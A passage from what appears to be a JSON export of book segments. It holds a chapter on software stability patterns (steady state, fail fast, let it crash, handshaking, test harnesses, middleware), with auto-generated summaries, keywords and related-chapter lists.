swapped in to replace a bad disk, thereby instantly annihilating the operating system on that server.\n\nIt’s best to keep people off production systems to the greatest extent possible. If the system needs a lot of crank-turning and hand-holding to keep running, then administrators develop the habit of staying logged in all the time. This situation probably indicates that the servers are “pets” rather than “cattle” and inevitably leads to fiddling. To that end, the system should be able to run at least one\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 102\n\nrelease cycle without human intervention. The logical extreme on the “no fiddling” scale is immutable infrastructure—it can’t be fiddled with! (See Automated Deployments, on page 242, for more about immutable infrastructure.)\n\n“One release cycle” may be pretty tough if the system is deployed once a quarter. On the other hand, a microservice being continuously deployed from version control should be pretty easy to stabilize for a release cycle.\n\nUnless the system is crashing every day (in which case, look for the presence of the stability antipatterns), the most common reason for logging in will probably be cleaning up log files or purging data.\n\nAny mechanism that accumulates resources (whether it’s log files in the filesystem, rows in the database, or caches in memory) is like a bucket from a high-school calculus problem. The bucket fills up at a certain rate, based on the accumulation of data. It must be drained at the same rate, or greater, or it will eventually overflow. When this bucket overflows, bad things happen: servers go down, databases get slow or throw errors, response times head for the stars. The Steady State pattern says that for every mechanism that accumulates a resource, some other mechanism must recycle that resource. Let’s look at sev- eral types of sludge that can accumulate and how to avoid the need for fiddling.\n\nData Purging\n\nIt certainly seems like a simple enough principle. Computing resources are always finite; therefore, you cannot continually increase consumption without limit. Still, in the rush of excitement about rolling out a new killer application, the next great mission-critical, bet-the-company whatever, data purging always gets the short end of the stick. It certainly doesn’t demo as well as…well, anything demos better than purging, really. It sometimes seems that you’ll be lucky if the system ever runs at all in the real world. The notion that it’ll run long enough to accumulate too much data to handle seems like a “high-class problem”—the kind of problem you’d love to have.\n\nNevertheless, someday your little database will grow up. When it hits the teenage years—about two in human years—it’ll get moody, sullen, and resentful. In the worst case, it’ll start undermining the whole system (and it will probably complain that nobody understands it, too).\n\nThe most obvious symptom of data growth will be steadily increasing I/O rates on the database servers. You may also see increasing latency at constant loads.\n\nData purging is nasty, detail-oriented work. Referential integrity constraints in a relational database are half the battle. It can be difficult to cleanly remove\n\nreport erratum • discuss\n\nSteady State • 103\n\nobsolete data without leaving orphaned rows. The other half of the battle is ensuring that applications still work once the data is gone. That takes coding and testing.\n\nThere are few general rules here. Much depends on the database and libraries in use. RDBMS plus ORM tends to deal badly with dangling references, for example, whereas a document-oriented database won’t even notice.\n\nAs a consequence, data purging always gets left until after the first release is out the door. The rationale is, “We’ve got six months after launch to implement purging.” (Somehow, they always say “six months.” It’s kind of like a programmer’s estimate of “two weeks.”)\n\nOf course, after launch, there are always emergency releases to fix critical defects or add “must-have” features from marketers tired of waiting for the software to be done. The first six months can slip away pretty quickly, but when that first release launches, a fuse is lit.\n\nAnother type of sludge you will commonly encounter is old log files.\n\nLog Files\n\nOne log file is like one pile of cow dung—not very valuable, and you’d rather not dig through it. Collect tons of cow dung and it becomes “fertilizer.” Like- wise, if you collect enough log files you can discover value.\n\nLeft unchecked, however, log files on individual machines are a risk. When log files grow without bound, they’ll eventually fill up their containing filesystem. Whether that’s a volume set aside for logs, the root disk, or the application installation directory (I hope not), it means trouble. When log files fill up the filesystem, they jeopardize stability. That’s because of the different negative effects that can occur when the filesystem is full. On a UNIX system, the last 5–10 percent (depending on the configuration of the filesystem) of space is reserved for root. That means an application will start getting I/O errors when the filesystem is 90 or 95 percent full. Of course, if the application is running as root, then it can consume the very last byte of space. On a Windows system, an application can always use the very last byte. In either case, the operating system will report errors back to the application.\n\nWhat happens next is anyone’s guess. In the best-case scenario, the logging filesystem is separate from any critical data storage (such as transactions), and the application code protects itself well enough that users never realize anything is amiss. Significantly less pleasant, but still tolerable, is a nicely worded error message asking the users to have patience with us and please\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 104\n\ncome back when we’ve got our act together. Several rungs down the ladder is serving a stack trace to the user.\n\nWorse yet, the developers in one system I saw had added a “universal exception handler” to the servlet pipeline. This handler would log any kind of exception. It was reentrant, so if an exception occurred while logging an exception, it would log both the original and the new exception. As soon as the filesystem got full, this poor exception handler went nuts, trying to log an ever-increasing stack of exceptions. Because there were multiple threads, each trying to log its own Sisyphean exception, this application server was able to consume eight entire CPUs—for a little while, anyway. The exceptions, multiplying like Leonardo of Pisa’s rabbits, rapidly consumed all available memory. This was followed shortly by a crash.\n\nOf course, it’s always better to avoid filling up the filesystem in the first place. Log file rotation requires just a few minutes of configuration.\n\nIn the case of legacy code, third-party code, or code that doesn’t use one of the excellent logging frameworks available, the logrotate utility is ubiquitous on UNIX. For Windows, you can try building logrotate under Cygwin, or you can hand roll a .vbs or .bat script to do the job. Logging can be a wonderful aid to transparency. Make sure that all log files will get rotated out and eventually purged, though, or you’ll eventually spend time fixing the tool that’s supposed to help you fix the system.\n\nWhat About Compliance? Don’t We Have to Keep All Our Log Files Forever?\n\nYou will sometimes hear people talking about logging in terms of compliance require- ments. Compliance in all its forms makes many heavy demands on IT infrastructure and operations. The specific demands depend on your industry, but there’s always a component about “controls.” The Sarbanes–Oxley Act of 2002 (SOX) requires adequate controls on any system that produces financially significant information. The company must be able to demonstrate that nobody can monkey with the financial data. Another common requirement is to record and demonstrate that only authorized users accessed certain data. Many companies also face industry- and country-specific regulations.\n\nThese various compliance regimes require you to retain logs for years. Individual machines can’t possibly retain logs that long. Most of the machines don’t live that long, especially if you’re in the cloud! The best thing to do is get logs off of production machines as quickly as possible. Store them on a centralized server and monitor it closely for tampering.\n\nreport erratum • discuss",
      "page_number": 107,
      "chapter_number": 14,
      "summary": "This chapter covers segment 14 (pages 107-114). Key topics include patterns, service, and breaker.",
      "keywords": [
        "Circuit Breaker",
        "Circuit",
        "circuit breaker state",
        "Breaker",
        "system",
        "circuit breaker fail",
        "circuit breaker resets",
        "circuit breaker trips",
        "circuit breaker returns",
        "circuit breaker makes",
        "circuit breaker executes",
        "state",
        "circuit breaker exists",
        "Foo Bar Baz",
        "breaker state"
      ],
      "concepts": [
        "patterns",
        "service",
        "breaker",
        "states",
        "operation",
        "operations",
        "operating",
        "bulkheads",
        "useful",
        "uses"
      ],
      "similar_chapters": [
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 8,
          "title": "Segment 8 (pages 57-67)",
          "relevance_score": 0.56,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Distilled",
          "chapter": 38,
          "title": "Segment 38 (pages 345-352)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 34,
          "title": "Segment 34 (pages 335-344)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "AntiPatterns",
          "chapter": 4,
          "title": "Segment 4 (pages 30-37)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 15,
      "title": "Segment 15 (pages 115-122)",
      "start_page": 115,
      "end_page": 122,
      "detection_method": "topic_boundary",
      "content": "Steady State • 105\n\nLog files on production systems have a terrible signal-to-noise ratio. It’s best to get them off the individual hosts as quickly as possible. Ship the log files to a centralized logging server, such as Logstash, where they can be indexed, searched, and monitored.\n\nBetween data in the database and log files on the disk, persistent data can find plenty of ways to clog up your system. Like a jingle from an old commer- cial, sludge stuck in memory clogs up your application.\n\nIn-Memory Caching\n\nTo a long-running server, memory is like oxygen. Cache, left untended, will suck up all the oxygen. Low memory conditions are a threat to both stability and capacity. Therefore, when building any sort of cache, it’s vital to ask two questions:\n\nIs the space of possible keys finite or infinite? • Do the cached items ever change?\n\nIf the number of possible keys has no upper bound, then cache size limits must be enforced and the cache needs some form of cache invalidation. The simplest mechanism is a time-based cache flush. You can also investigate least recently used (LRU) or working-set algorithms, but nine times out of ten, a periodic flush will do.\n\nImproper use of caching is the major cause of memory leaks, which in turn lead to horrors like daily server restarts. Nothing gets administrators in the habit of being logged onto production like daily (or nightly) chores.\n\nSludge buildup is a major cause of slow responses, so Steady State helps avoid that antipattern. Steady State also encourages better operational discipline by limiting the need for system administrators to log on to the production servers.\n\nRemember This\n\nAvoid fiddling.\n\nHuman intervention leads to problems. Eliminate the need for recurring human intervention. Your system should run for at least a typical deployment cycle without manual disk cleanups or nightly restarts.\n\nPurge data with application logic.\n\nDBAs can create scripts to purge data, but they don’t always know how the application behaves when data is removed. Maintaining logical integrity, especially if you use an ORM tool, requires the application to purge its own data.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 106\n\nLimit caching.\n\nIn-memory caching speeds up applications, until it slows them down. Limit the amount of memory a cache can consume.\n\nRoll the logs.\n\nDon’t keep an unlimited amount of log files. Configure log file rotation based on size. If you need to retain them for compliance, do it on a non- production server.\n\nFail Fast\n\nIf slow responses are worse than no response, the worst must surely be a slow failure response. It’s like waiting through the interminable line at the DMV, only to be told you need to fill out a different form and go back to the end of the line. Can there be any bigger waste of system resources than burning cycles and clock time only to throw away the result?\n\nIf the system can determine in advance that it will fail at an operation, it’s always better to fail fast. That way, the caller doesn’t have to tie up any of its capacity waiting and can get on with other work.\n\nHow can the system tell whether it will fail? Do we need Deep Learning? Don’t worry, you won’t need to hire a cadre of data scientists.\n\nIt’s actually much more mundane than that. There’s a large class of “resource unavailable” failures. For example, when a load balancer gets a connection request but not one of the servers in its service pool is functioning, it should immediately refuse the connection. Some configurations have the load balancer queue the connection request for a while in the hopes that a server will become available in a short period of time. This violates the Fail Fast pattern.\n\nThe application or service can tell from the incoming request or message roughly what database connections and external integration points will be needed. The service can quickly check out the connections it will need and verify the state of the circuit breakers around the integration points. This is sort of the software equivalent of the chef’s mise en place—gathering all the ingredients needed to perform the request before it begins. If any of the resources are not available, the service can fail immediately, rather than getting partway through the work.\n\nAnother way to fail fast in a web application is to perform basic parameter- checking in the servlet or controller that receives the request, before talking to the database. This would be a good reason to move some parameter checking out of domain objects into something like a “Query object.”\n\nreport erratum • discuss\n\nFail Fast • 107\n\n“We Got the Fax—It’s All Black”\n\nOne of my more interesting projects was for a studio photography company. Part of the project involved working on the software that rendered images for high-resolution printing. The previous generation of this software had a problem that generated more work for humans downstream: if color profiles, images, backgrounds, or alpha masks weren’t available, it “rendered” a black image full of zero-valued pixels. This black image went into the printing pipeline and was printed, wasting paper, chemicals, and time. Quality checkers would pull the black image and send it back to the people at the beginning of the process for diagnosis, debugging, and correction. Ultimately, they would fix the problem (usually by calling developers to the printing facility) and remake the bad print. Since the order was already late getting out the door, they would expedite the remake—meaning it interrupted the pipeline of work and went to the head of the line.\n\nWhen my team started on the rendering software, we applied the Fail Fast pattern. As soon as the print job arrived, the renderer checked for the presence of every font (missing fonts caused a similar remake, but not because of black images), image, background, and alpha mask. It preallocated memory, so it couldn’t fail an allocation later. The renderer reported any such failure to the job control system immediately, before it wasted several minutes of compute time. Best of all, “broken” orders would be pulled from the pipeline, avoiding the case of having partial orders waiting at the end of the process. Once we launched the new renderer, the software-induced remake rate dropped to zero. Orders could still be remade because of other quality problems —dust in the camera, poor exposure, or bad cropping—but at least our software wasn’t the cause.\n\nThe only thing we didn’t preallocate was disk space for the final image. We violated “steady state” under the direction of the customer, who indicated that he had his own rock-solid purging process. Turns out the “purging process” was one guy who occasionally deleted a bunch of files by hand. Less than one year after we launched, the drives filled up. Sure enough, the one place we broke the Fail Fast principle was the one place our renderer failed to report errors before wasting effort. It would render images—several minutes of compute time—and then throw an exception.\n\nEven when failing fast, be sure to report a system failure (resources not available) differently than an application failure (parameter violations or invalid state). Reporting a generic “error” message may cause an upstream system to trip a circuit breaker just because some user entered bad data and hit Reload three or four times.\n\nThe Fail Fast pattern improves overall system stability by avoiding slow responses. Together with timeouts, failing fast can help avert impending cascading failures. It also helps maintain capacity when the system is under stress because of partial failures.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 108\n\nRemember This\n\nAvoid Slow Responses and Fail Fast.\n\nIf your system cannot meet its SLA, inform callers quickly. Don’t make them wait for an error message, and don’t make them wait until they time out. That just makes your problem into their problem.\n\nReserve resources, verify Integration Points early.\n\nIn the theme of “don’t do useless work,” make sure you’ll be able to com- plete the transaction before you start. If critical resources aren’t available —for example, a popped Circuit Breaker on a required callout—then don’t waste work by getting to that point. The odds of it changing between the beginning and the middle of the transaction are slim.\n\nUse for input validation.\n\nDo basic user input validation even before you reserve resources. Don’t bother checking out a database connection, fetching domain objects, populating them, and calling validate() just to find out that a required parameter wasn’t entered.\n\nLet It Crash\n\nSometimes the best thing you can do to create system-level stability is to abandon component-level stability. In the Erlang world, this is called the “let it crash” philosophy. We know from Chapter 2, Case Study: The Excep- tion That Grounded an Airline, on page 9, that there is no hope of preventing every possible error. Dimensions proliferate and the state space exponentiates. There’s just no way to test everything or predict all the ways a system can break. We must assume that errors will happen.\n\nThe key question is, “What do we do with the error?” Most of the time, we try to recover from it. That means getting the system back into a known good state using things like exception handlers to fix the execution stack and try-finally blocks or block-scoped resources to clean up memory leaks. Is that sufficient?\n\nThe cleanest state your program can ever have is right after startup. The “let it crash” approach says that error recovery is difficult and unreliable, so our goal should be to get back to that clean startup as rapidly as possible.\n\nFor “let it crash” to work, a few things have to be true in our system.\n\nLimited Granularity\n\nThere must be a boundary for the crashiness. We want to crash a component in isolation. The rest of the system must protect itself from a cascading failure.\n\nreport erratum • discuss\n\nLet It Crash • 109\n\nIn Erlang or Elixir, the natural boundary is the actor. The runtime system allows an actor to terminate without taking down the entire operating system process. Other languages have actor libraries, such as Akka for Java and Scala.1 These overlay the actor model on a runtime that has no idea what an actor is. If you follow the library’s rules for resource management and state isolation, you can still get the benefits of “let it crash.” You should plan on more code reviews to make sure every developer follows those rules, though!\n\nIn a microservices architecture, a whole instance of the service might be the right granularity. This depends largely on how quickly it can be replaced with a clean instance, which brings us to the next key consideration.\n\nFast Replacement\n\nWe must be able to get back into that clean state and resume normal operation as quickly as possible. Otherwise, we’ll see performance degrade when too many of our instances are restarting at the same time. In the limit, we could have loss of service because all of our instances are busy restarting.\n\nWith in-process components like actors, the restart time is measured in microseconds. Callers are unlikely to really notice that kind of disruption. You’d have to set up a special test case just to measure it.\n\nService instances are trickier. It depends on how much of the “stack” has to be started up. A few examples will help illustrate that:\n\nWe’re running Go binaries in a container. Startup time for a new container and a process in it is measured in milliseconds. Crash the whole container.\n\nIt’s a NodeJS service running on a long-running virtual machine in AWS. Starting the NodeJS process takes milliseconds, but starting a new VM takes minutes. In this case, just crash the NodeJS process.\n\nAn aging JavaEE application with an API pranged into the front end runs on virtual machines in a data center. Startup time is measured in minutes. “Let it crash” is not the right strategy.\n\nSupervision\n\nWhen we crash an actor or a process, how does a new one get started? You could write a bash script with a while() loop in it. But what happens when the problem persists across restarts? The script basically fork-bombs the server.\n\n1.\n\nhttp://akka.io\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 110\n\nActor systems use a hierarchical tree of supervisors to manage the restarts. Whenever an actor terminates, the runtime notifies the supervisor. The supervisor can then decide to restart the child actor, restart all of its children, or crash itself. If the supervisor crashes, the runtime will terminate all its children and notify the supervisor’s supervisor. Ultimately you can get whole branches of the supervision tree to restart with a clean state. The design of the supervision tree is integral to the system design.\n\nIt’s important to note that the supervisor is not the service consumer. Manag- ing the worker is different than requesting work. Systems suffer when they conflate the two.\n\nSupervisors need to keep close track of how often they restart child processes. It may be necessary for the supervisor to crash itself if child restarts happen too densely. This would indicate that either the state isn’t sufficiently cleaned up or the whole system is in jeopardy and the supervisor is just masking the underlying problem.\n\nWith service instances in a PaaS environment, the platform itself decides to launch a replacement. In a virtualized environment with autoscaling, the autoscaler decides whether and where to launch a replacement. Still, these are not the same as a supervisor because they lack discretion. They will always restart the crashed instance, even if it is just going to crash again immediately. There’s also no notion of hierarchical supervision.\n\nReintegration\n\nThe final element of a “let it crash” strategy is reintegration. After an actor or instance crashes and the supervisor restarts it, the system must resume calling the newly restored provider. If the instance was called directly, then callers should have circuit breakers to automatically reintegrate the instance. If the instance is part of a load-balanced pool, then the instance must be able to join the pool to accept work. A PaaS will take care of this for containers. With statically allocated virtual machines in a data center, the instance should be reintegrated when health checks from the load balancer begin to pass.\n\nRemember This\n\nCrash components to save systems.\n\nIt may seem counterintuitive to create system-level stability through component-level instability. Even so, it may be the best way to get back to a known good state.\n\nreport erratum • discuss\n\nHandshaking • 111\n\nRestart fast and reintegrate.\n\nThe key to crashing well is getting back up quickly. Otherwise you risk loss of service when too many components are bouncing. Once a compo- nent is back up, it should be reintegrated automatically.\n\nIsolate components to crash independently.\n\nUse Circuit Breakers to isolate callers from components that crash. Use supervisors to determine what the span of restarts should be. Design your supervision tree so that crashes are isolated and don’t affect unrelated functionality.\n\nDon’t crash monoliths.\n\nLarge processes with heavy runtimes or long startups are not the right place to apply this pattern. Applications that couple many features into a single process are also a poor choice.\n\nHandshaking\n\nHandshaking refers to signaling between devices that regulate communication between them. Serial protocols such as EIA-232C (formerly known as RS-232) rely on the receiver to indicate when it’s ready to receive data. Analog modems used a form of handshaking to negotiate a speed and a signal encoding that both devices would agree upon. And, as illustrated earlier in the three-phase handshake on page 37, TCP uses a three-phase handshake to establish a socket connection. TCP handshaking also allows the receiver to signal the sender to stop sending data until the receiver is ready. Handshaking is ubiquitous in low-level communications protocols but is almost nonexistent at the application level.\n\nThe sad truth is that HTTP isn’t good at shaking hands. HTTP-based protocols, such as XML-RPC or WS-I Basic, have few options available for handshaking. HTTP provides a response code of “503 Service Unavailable,” which is defined to indicate a temporary condition.2 Most clients, however, will not distinguish between different response codes. If the code is not a “200 OK,” “403 Authentication Required,” or “302 Found (redirect),” the client probably treats the response as a fatal error. Many clients even treat other 200 series codes as errors!\n\nSimilarly, the protocols beneath every remote procedure call technology (CORBA, DCOM, Java RMI, and so on) are equally bad at signaling their readiness to do business.\n\n2.\n\nwww.w3.org/Protocols/rfc2616/rfc2616-sec10.html\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 112\n\nHandshaking is all about letting the server protect itself by throttling its own workload. Instead of being victim to whatever demands are made upon it, the server should have a way to reject incoming work. The closest approximation I’ve been able to achieve with HTTP-based servers relies on a partnership between a load balancer and the web or application servers. The web server notifies the load balancer—which is pinging a “health check” page on the web server periodically—that it is busy by returning either an error page (HTTP response code 503 “Not Available” works) or an HTML page with an error message. The load balancer then knows not to send any additional work to that particular web server.\n\nOf course, this helps only for web services and still breaks down if all the web servers are too busy to serve another page.\n\nWhen there are several services, each can provide a “health check” query for use by load balancers. The load balancer would then check the health of the server before directing a request to that instance. This provides good hand- shaking at a relatively small expense to the service.\n\nHandshaking can be most valuable when unbalanced capacities are leading to slow responses. If the server can detect that it will not be able to meet its SLAs, then it should have some means to ask the caller to back off. If the servers are sitting behind a load balancer, then they have the binary on/off control of stopping responses to the load balancer, which would in turn take the unresponsive server out of the pool. This is a crude mechanism, though. Your best bet is to build handshaking into any custom protocols that you implement.\n\nCircuit Breaker is a stopgap you can use when calling services that cannot handshake. In that case, instead of asking politely whether the server can handle the request, you just make the call and track whether it works.\n\nOverall, handshaking is an underused technique that could be applied to great advantage in application-layer protocols. It is an effective way to stop cracks from jumping layers, as in the case of a cascading failure.\n\nRemember This\n\nCreate cooperative demand control.\n\nHandshaking between a client and a server permits demand throttling to serviceable levels. Both the client and the server must be built to perform handshaking. Most common application-level protocols do not perform handshaking.\n\nreport erratum • discuss",
      "page_number": 115,
      "chapter_number": 15,
      "summary": "This chapter covers segment 15 (pages 115-122). Key topics include data, state. The other half of the battle is ensuring that applications still work once the data is gone.",
      "keywords": [
        "log files",
        "Fail Fast",
        "system",
        "log",
        "Fail Fast pattern",
        "n’t",
        "crash",
        "State",
        "files",
        "application",
        "data",
        "Fail",
        "Fast",
        "report erratum",
        "time"
      ],
      "concepts": [
        "data",
        "state",
        "log",
        "logs",
        "logging",
        "caching",
        "cache",
        "requires",
        "requirement",
        "server"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 4,
          "title": "Segment 4 (pages 27-35)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 33,
          "title": "Segment 33 (pages 281-289)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 15,
          "title": "Segment 15 (pages 122-129)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 3,
          "title": "Segment 3 (pages 17-24)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 16,
      "title": "Segment 16 (pages 123-130)",
      "start_page": 123,
      "end_page": 130,
      "detection_method": "topic_boundary",
      "content": "Test Harnesses • 113\n\nConsider health checks.\n\nUse health checks in clustered or load-balanced services as a way for instances to handshake with the load balancer.\n\nBuild handshaking into your own low-level protocols.\n\nIf you create your own socket-based protocol, build handshaking into it so that the endpoints can each inform the other when they are not ready to accept work.\n\nTest Harnesses\n\nAs you’ve seen in previous chapters, distributed systems have failure modes that are difficult to provoke in development or QA environments. To be more thorough about testing various components together, we often resort to an “integration testing” environment. In this environment, our system is fully integrated to all the other systems it interacts with.\n\nIntegration testing presents problems of its own, however. What version should we test against? For greatest assurance, we’d like to test against the versions of our dependencies that will be current when we release our system. We could prove by induction that this approach constrains the entire company to testing only one new piece of software at a time. (Naturally, the proof itself is left as an exercise for the reader.) Furthermore, the interdependencies of today’s systems create such an interlocking web of systems that an integration testing environment really becomes unitary—one global integration test that duplicates the real production systems of the entire enterprise. Such a unitary environment would need change control just as rigorous—or perhaps more so—than the actual production environments.\n\nThere is a more abstract difficulty. Integration test environments can verify only what the system does when its dependencies are working correctly. Although it may be possible to provoke the remote system into returning errors, it’s still functioning more or less within specifications. If the specifica- tions say, ”The system shall return an error code 14916 unless the request includes the date of the last telephone sanitization,” then the caller can force that error condition to occur. Nevertheless, the remote system is still operating within specifications.\n\nThe main theme of this book, however, is that every system will eventually end up operating outside of spec; therefore, it’s vital to test the local system’s behavior when the remote system goes wonky. Unless the designers of the remote system built in modes that simulate the whole range of out-of-spec\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 114\n\nfailures that can occur naturally in production, there will be behaviors that integration testing does not verify.\n\nA better approach to integration testing would allow you to test most or all of these failure modes. It should preserve or enhance system isolation to avoid the version-locking problem and allow testing in many locations instead of the unitary enterprise-wide integration testing environment I described earlier on page 113.\n\nTo do that, you can create test harnesses to emulate the remote system on the other end of each integration point. Hardware and mechanical engineers have used test harnesses for a long time. Software engineers have used test harnesses, but not as maliciously as they should. A good test harness should be devious. It should be as nasty and vicious as real-world systems will be. The test harness should leave scars on the system under test. Its job is to make the system under test cynical.\n\nWhy Not Mock Objects?\n\nMock objects are a technique commonly applied with unit testing. A mock object supplies an alternative implementation—to be used by the object under test—that can be controlled by the unit test itself. For example, suppose an application uses a DataGateway object as a layer façade for the entire persistence layer. The real implemen- tation of DataGateway would deal with connection parameters, a database server, and a bunch of test data. That’s a lot of coupling for a single test, which often results in irreproducible test results or hidden dependencies between tests. A mock object improves the isolation of a unit test by cutting off all the external connections. Mock objects are often used at the boundaries between layers.\n\nSome mock objects can be set up to throw exceptions when the object under test invokes their methods. This does permit the unit test to simulate some kinds of fail- ures, especially those that map to exceptions (assuming that the underlying code in the real implementation would generate exceptions).\n\nA test harness differs from mock objects in that a mock object can only be trained to produce behavior that conforms to the defined interface. A test harness runs as a separate server, so it’s not obliged to conform to any interface. It can provoke network errors, protocol errors, or application-level errors. If all low-level errors were guaranteed to be recognized, caught, and thrown as the right type of exception, we would not need test harnesses.\n\nConsider building a test harness that substitutes for the remote end of every web services call. Because the remote call uses the network, the socket con- nection is susceptible to the following failures:\n\nreport erratum • discuss\n\nTest Harnesses • 115\n\nIt can be refused.\n\nIt can sit in a listen queue until the caller times out.\n\nThe remote end can reply with a SYN/ACK and then never send any data.\n\nThe remote end can send nothing but RESET packets.\n\nThe remote end can report a full receive window and never drain the data.\n\nThe connection can be established, but the remote end never sends a byte\n\nof data.\n\nThe connection can be established, but packets could be lost, causing\n\nretransmit delays.\n\nThe connection can be established, but the remote end never acknowledges\n\nreceiving a packet, causing endless retransmits.\n\nThe service can accept a request, send response headers (supposing\n\nHTTP), and never send the response body.\n\nThe service can send one byte of the response every thirty seconds.\n\nThe service can send a response of HTML instead of the expected XML.\n\nThe service can send megabytes when kilobytes are expected.\n\nThe service can refuse all authentication credentials.\n\nThese failures fall into distinct categories: network transport problems, net- work protocol problems, application protocol problems, and application logic problems. With a little mental exercise, you can find failure modes in every layer of the seven-layer OSI model. It would be costly and bizarre to add switches and flags to applications that would allow them to simulate all of these failures. Who would want to risk turning on a “simulated failure” once the system is promoted into production? Integration testing environments are good at examining failures only in the seventh layer—the application layer—and not even all of those.\n\nA test harness “knows” that it’s meant for testing; it has no other role to play. Although the real application wouldn’t be written to call the low-level network APIs directly, the test harness can be. Therefore, it’s able to send bytes too quickly, or very slowly. It can set up extremely deep listen queues. It can bind to a socket and then never service a single connection attempt. The test harness should act like a little hacker, trying all kinds of bad behavior to break callers.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 116\n\nMany kinds of bad behavior will be similar for different applications and protocols. For example, refusing connections, connecting slowly, and accepting requests without reply would apply to any socket protocol: HTTP, RMI, or RPC. For these, a single test harness can simulate many types of bad network behavior. One trick I like is to have different port numbers indicate different kinds of misbehavior. On port 10200, it would accept connections but never reply. Port 10201 gets a connection and a reply, but the reply will be copied from /dev/random. Port 10202 will open a connection, then drop it immediately, and so on. That way, I don’t need to change modes on the test harness and a single test harness can break many applications. It can even help with functional testing in the development environment by letting multiple developers hit the test harness from their workstations. (Of course, it’s also worthwhile to let the developers run their own instances of the killer test harness.)\n\nBear in mind that your test harness might be really, really good at breaking, even killing applications. It’s not a bad idea to have the test harness log requests, in case your application dies without so much as a whimper to indicate what killed it.\n\nA test harness that injects faults will unearth many hidden dependencies. Injecting latency in requests will uncover many more. Reordering TCP packets will uncover more again. The only limit is your imagination.\n\nThe test harness can be designed like an application server; it can have pluggable behavior for the tests that are related to the real application. A single framework for the test harness can be subclassed to implement any application-level protocol, or any perversion of the application-level protocol, necessary. Broadly speaking, a test harness leads toward “chaos engineering,” which we explore in Chapter 17, Chaos Engineering, on page 325.\n\nRemember This\n\nEmulate out-of-spec failures.\n\nCalling real applications lets you test only those errors that the real application can deliberately produce. A good test harness lets you simulate all sorts of messy, real-world failure modes.\n\nStress the caller.\n\nThe test harness can produce slow responses, no responses, or garbage responses. Then you can see how your application reacts.\n\nreport erratum • discuss\n\nDecoupling Middleware • 117\n\nLeverage shared harnesses for common failures.\n\nYou don’t necessarily need a separate test harness for each integration point. A “killer” server can listen to several ports, creating different failure modes depending on which port you connect to.\n\nSupplement, don’t replace, other testing methods.\n\nThe Test Harness pattern augments other testing methods. It does not replace unit tests, acceptance tests, penetration tests, and so on. Each of those techniques help verify functional behavior. A test harness helps verify “nonfunctional” behavior while maintaining isolation from the remote systems.\n\nDecoupling Middleware\n\nMiddleware is a graceless name for tools that inhabit a singularly messy space —integrating systems that were never meant to work together. Rebranded as enterprise application integration, middleware became a hot property for a few years in the early 2000s and then faded back into its shadowy, thankless realm. Middleware occupies the essential interstices between enterprise sys- tems. It is the connective tissue that bridges gaps between different islands of automation. (How’s that for a mixed metaphor?)\n\nOften described as “plumbing”—with all the related connotations—middleware will always remain inherently messy, since it must work with different business processes, different technologies, and even different definitions of the same logical concept. This “unsexiness” must be part of the reason why service- oriented architectures are currently stealing attention from the less glamorous, but more necessary, job of middleware.\n\nDone well, middleware simultaneously integrates and decouples systems. It integrates them by passing data and events back and forth between the sys- tems. It decouples them by letting the participating systems remove specific knowledge of and calls to the other systems. Since integration points are the number one cause of instability, this looks like a good thing.\n\nAny kind of synchronous call-and-response or request/reply method forces the calling system to stop what it’s doing and wait. In this model, the calling system and the receiving system must both be active at the same time—they are syn- chronous in time—though they may be in different places. This category covers remote procedure calls (RPCs), HTTP, XML-RPC, RMI, CORBA, DCOM, and any other analog of local method calls. Tightly coupled middleware amplifies shocks to the system. Synchronous calls are particularly vicious amplifiers that facilitate cascading failures. Yes, this includes JSON over HTTP, too.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 118\n\nLess tightly coupled forms of middleware allow the calling and receiving sys- tems to process messages in different places and at different times. The ven- erable IBM MQseries and any queue-based or publish/subscribe messaging systems fall into this category, as does system-to-system messaging via SMTP or SMS. (These latter two protocols frequently have message brokers imple- mented with carbon, hydrogen, oxygen, and nitrogen rather than silicon. Latency also tends to be high.) The following figure depicts the spectrum of coupling exhibited by different middleware technologies.\n\nSame TimeSame HostSame ProcessDiﬀerent TimeDiﬀerent HostDiﬀerent ProcessIn-ProcessMethod CallsShared MemoryPipesSemaphoresWindows EventsInterprocessCommunicationC FunctionsJava CallsDynamic LibsDCE RPCDCOMRMIXML-RPCHTTPRemoteProcedure CallsSame TimeDiﬀerent HostDiﬀerent ProcessMQPub-SubSMTPSMSMessage-OrientedMiddlewareJavaSpacesGigaSpacesPySpacesTuple Spaces\n\nMessage-oriented middleware decouples the endpoints in both space and time. Because the requesting system doesn’t just sit around waiting for a reply, this form of middleware cannot produce a cascading failure. Messaging systems used to be some of the most expensive infrastructure you would buy. These days, we have very solid open source tools as well.\n\nThe main advantage of synchronous (tightly coupled) middleware lies in its logical simplicity. Suppose a customer’s proposed credit card purchase needs to be authorized. If this authorization is implemented using a remote procedure call or XML-RPC, the application can clearly decide whether to proceed with the next step of the checkout process or send the user back to the payment 